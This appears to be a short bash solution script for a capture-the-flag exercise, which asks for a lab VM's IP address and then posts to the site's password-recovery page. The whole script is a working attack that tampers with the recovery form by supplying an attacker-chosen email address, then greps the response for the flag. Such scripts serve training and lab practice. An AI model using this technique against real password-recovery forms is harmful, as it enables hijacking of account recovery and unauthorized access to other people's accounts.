#!/bin/bash
echo input the VM ip address :
read ip

url="http://${ip}/?page=recover"

response=$(curl -s -F "mail=attacker@email.bad" -F "Submit=Submit" "$url" | grep "flag")
response=$(cut -f3 -d ":" <<< $response | cut -c -65)
echo "FLAG:${response}"